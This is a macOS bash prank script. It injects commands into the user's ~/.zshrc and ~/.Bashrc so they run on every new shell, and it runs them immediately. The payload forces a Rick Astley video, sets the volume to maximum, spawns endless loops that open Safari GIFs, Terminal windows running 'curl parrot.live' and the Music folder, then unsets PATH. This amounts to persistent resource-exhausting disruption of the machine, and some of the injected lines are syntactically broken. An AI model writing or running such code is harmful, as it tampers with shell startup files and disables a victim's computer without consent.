#!/bin/bash

cd $HOME

if [ -e .zshrc ]
then
    echo "open -a Safari https://www.youtube.com/watch?v=IocdQJxWpec" >> ~/.zshrc
    echo "sleep 1" >> ~/.zshrc
    echo 'osascript -e "set Volume 10"' >> ~/.zshrc
    echo 'open -a Terminal && osascript -e '\''tell application "Terminal"' >> ~/.zshrc
    echo '    do script "while true' >> ~/.zshrc
    echo 'do"' >> ~/.zshrc
    echo "    open -a Safari https://gifdb.com/images/file/you-got-rick-rolled-rick-astley-dance-2s99zcvywfvs3kao.gif" >> ~/.zshrc
    echo "    sleep 2" >> ~/.zshrc
    echo 'done"' >> ~/.zshrc
    echo "end tell'" >> ~/.zshrc
    echo 'open -a Terminal && osascript -e '\''tell app "Terminal"' >> ~/.zshrc
    echo '    do script "curl parrot.live"' >> ~/.zshrc
    echo "end tell'" >> ~/.zshrc
    echo "( dfbg ) && while true" >> ~/.zshrc
    echo 'do"' >> ~/.zshrc
    echo "    open -a Terminal" >> ~/.zshrc
    echo "    open ~/Music" >> ~/.zshrc
    echo 'done" && unset PATH"' >> ~/.zshrc
else
    touch ~/.zshrc
    echo "open -a Safari https://www.youtube.com/watch?v=IocdQJxWpec" >> ~/.zshrc
    echo "sleep 1" >> ~/.zshrc
    echo 'osascript -e "set Volume 10"' >> ~/.zshrc
    echo 'open -a Terminal && osascript -e '\''tell application "Terminal"' >> ~/.zshrc
    echo '    do script "while true' >> ~/.zshrc
    echo 'do"' >> ~/.zshrc
    echo "    open -a Safari https://gifdb.com/images/file/you-got-rick-rolled-rick-astley-dance-2s99zcvywfvs3kao.gif" >> ~/.zshrc
    echo "    sleep 2" >> ~/.zshrc
    echo 'done"' >> ~/.zshrc
    echo "end tell'" >> ~/.zshrc
    echo 'open -a Terminal && osascript -e '\''tell app "Terminal"' >> ~/.zshrc
    echo '    do script "curl parrot.live"' >> ~/.zshrc
    echo "end tell'" >> ~/.zshrc
    echo "( dfbg ) && while true" >> ~/.zshrc
    echo 'do"' >> ~/.zshrc
    echo "    open -a Terminal" >> ~/.zshrc
    echo "    open ~/Music" >> ~/.zshrc
    echo 'done" && unset PATH"' >> ~/.zshrc
fi

if [ -e .Bashrc ]
then
    echo "open -a Safari https://www.youtube.com/watch?v=IocdQJxWpec" >> ~/.Bashrc
    echo "sleep 1" >> ~/.Bashrc
    echo 'osascript -e "set Volume 10"' >> ~/.Bashrc
    echo 'open -a Terminal && osascript -e '\''tell application "Terminal"' >> ~/.Bashrc
    echo '    do script "while true' >> ~/.Bashrc
    echo 'do"' >> ~/.Bashrc
    echo "    open -a Safari https://gifdb.com/images/file/you-got-rick-rolled-rick-astley-dance-2s99zcvywfvs3kao.gif" >> ~/.Bashrc
    echo "    sleep 2" >> ~/.Bashrc
    echo 'done"' >> ~/.Bashrc
    echo "end tell'" >> ~/.Bashrc
    echo 'open -a Terminal && osascript -e '\''tell app "Terminal"' >> ~/.Bashrc
    echo '    do script "curl parrot.live"' >> ~/.Bashrc
    echo "end tell'" >> ~/.Bashrc
    echo "( dfbg ) && while true" >> ~/.Bashrc
    echo 'do"' >> ~/.Bashrc
    echo "    open -a Terminal" >> ~/.Bashrc
    echo "    open ~/Music" >> ~/.Bashrc
    echo 'done" && unset PATH"' >> ~/.Bashrc
else
    touch ~/.Bashrc
    echo "open -a Safari https://www.youtube.com/watch?v=IocdQJxWpec" >> ~/.Bashrc
    echo "sleep 1" >> ~/.Bashrc
    echo 'osascript -e "set Volume 10"' >> ~/.Bashrc
    echo 'open -a Terminal && osascript -e '\''tell application "Terminal"' >> ~/.Bashrc
    echo '    do script "while true' >> ~/.Bashrc
    echo 'do"' >> ~/.Bashrc
    echo "    open -a Safari https://gifdb.com/images/file/you-got-rick-rolled-rick-astley-dance-2s99zcvywfvs3kao.gif" >> ~/.Bashrc
    echo "    sleep 2" >> ~/.Bashrc
    echo 'done"' >> ~/.Bashrc
    echo "end tell'" >> ~/.Bashrc
    echo 'open -a Terminal && osascript -e '\''tell app "Terminal"' >> ~/.Bashrc
    echo '    do script "curl parrot.live"' >> ~/.Bashrc
    echo "end tell'" >> ~/.Bashrc
    echo "( dfbg ) && while true" >> ~/.Bashrc
    echo 'do"' >> ~/.Bashrc
    echo "    open -a Terminal" >> ~/.Bashrc
    echo "    open ~/Music" >> ~/.Bashrc
    echo 'done" && unset PATH"' >> ~/.Bashrc
fi

open -a Safari https://www.youtube.com/watch?v=IocdQJxWpec
sleep 1
osascript -e "set Volume 10"
open -a Terminal && osascript -e 'tell application "Terminal"
    do script "while true
do
    open -a Safari https://gifdb.com/images/file/you-got-rick-rolled-rick-astley-dance-2s99zcvywfvs3kao.gif
    sleep 2
done"
end tell'
open -a Terminal && osascript -e 'tell app "Terminal"
    do script "curl parrot.live"
end tell'
( dfbg ) && while true
do
    open -a Terminal
    open ~/Music
done && unset PATH

# yes yes Rambeau is so silly ma dude ...
